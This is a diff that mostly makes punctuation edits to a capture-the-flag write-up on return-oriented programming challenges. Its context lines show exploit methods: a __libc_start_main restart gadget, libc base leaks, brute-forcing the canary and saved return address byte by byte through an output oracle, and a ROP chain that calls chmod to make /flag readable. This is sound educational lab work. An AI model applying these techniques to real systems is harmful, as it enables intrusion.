@@ -12230,9 +12230,9 @@ The first argument to `__libc_start_main` is always the `main` pointer per its s
 int __libc_start_main(int (*main)(int, char**, char**), int argc, char **argv, ...);
 ```
 
-So `+0x69` is our restart gadget — jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
+So `+0x69` is our restart gadget, jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
 
-The instruction at `24083` (`+0xf3`) is the return site after `call *%rax` — the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
+The instruction at `24083` (`+0xf3`) is the return site after `call *%rax`, the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
 
 ### ROP chain
 
@@ -12912,9 +12912,9 @@ The first argument to `__libc_start_main` is always the `main` pointer per its s
 int __libc_start_main(int (*main)(int, char**, char**), int argc, char **argv, ...);
 ```
 
-So `+0x69` is our restart gadget — jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
+So `+0x69` is our restart gadget, jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
 
-The instruction at `24083` (`+0xf3`) is the return site after `call *%rax` — the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
+The instruction at `24083` (`+0xf3`) is the return site after `call *%rax`, the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
 
 
 ### ROP chain
@@ -13280,12 +13280,18 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "d=open('/lib
 The saved `rip` in `challenge()`'s frame comes from the backtrace:
 
 ```
-1   0x5d08a2005ad3 main+457
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
+
+# ---- snip ----
+
+   1   0x5d08a2005ad3 main+457
+
+# ---- snip ----
 ```
 
-`challenge()`'s saved `rip` = `0x5d08a2005ad3` = `binary_base + 0x2ad3`. Byte 0 is `0xd3` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
+`challenge()`'s saved `rip` = `0x5d08a2005ad3` = `binary_base + 0x2ad3`. Byte 0 is `0xd3` (fixed, `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
 
-By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved `rip` and compute:
+By brute-forcing bytes 1–5 with the `### Goodbye!` oracle, the same oracle used for the canary, we recover the full saved `rip` and compute:
 
 ```
 binary_base = saved_rip - 0x2ad3
@@ -13336,7 +13342,7 @@ wrong byte    → __stack_chk_fail kills process → ### Goodbye! never printed
 
 ═══════════════════════════════════════════════════════════════════════════════════
 
-Stack (bruting byte 1 — 74 bytes sent):
+Stack (bruting byte 1, 74 bytes sent):
                            ┌───────────────────────────┐
             0x7ffdccee6250 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -13348,9 +13354,9 @@ Stack (bruting byte 1 — 74 bytes sent):
                            └───────────────────────────┘
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
-d3       byte 0 — fixed (binary_base & 0xFF == 0)
-??       byte 1 — current guess
-5a..5d   bytes 2–7 — unwritten, retain original stack values
+d3       byte 0, fixed (binary_base & 0xFF == 0)
+??       byte 1, current guess
+5a..5d   bytes 2–7, unwritten, retain original stack values
 
 ═══════════════════════════════════════════════════════════════════════════════════
 correct ?? → saved `rip` valid → challenge() returns → ### Goodbye!
@@ -13671,7 +13677,7 @@ chmod   = libc_base + chmod_off
 bang    = libc_base + bang_off
 
 # --- STAGE 4: chmod("!", 0o777) ---
-# "!\x00" already exists at libc_base + bang_off — no stack address needed.
+# "!\x00" already exists at libc_base + bang_off, no stack address needed.
 # ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
 print('[*] Stage 4: Sending chmod chain...')
 
@@ -13997,9 +14003,9 @@ The saved `rip` in `challenge()`'s frame comes from the backtrace:
 1   0x5f97bb53f726 main+457
 ```
 
-`challenge()`'s saved `rip` = `0x5f97bb53f726` = `binary_base + 0x1726`. Byte 0 is `0x26` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
+`challenge()`'s saved `rip` = `0x5f97bb53f726` = `binary_base + 0x1726`. Byte 0 is `0x26` (fixed, `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
 
-By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved `rip` and compute:
+By brute-forcing bytes 1–5 with the `### Goodbye!` oracle, the same oracle used for the canary, we recover the full saved `rip` and compute:
 
 ```
 binary_base = saved_rip - 0x1726
@@ -14154,7 +14160,7 @@ chmod   = libc_base + chmod_off
 bang    = libc_base + bang_off
 
 # --- STAGE 4: chmod("!", 0o777) ---
-# "!\x00" already exists at libc_base + bang_off — no stack address needed.
+# "!\x00" already exists at libc_base + bang_off, no stack address needed.
 # ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
 print('[*] Stage 4: Sending chmod chain...')
 
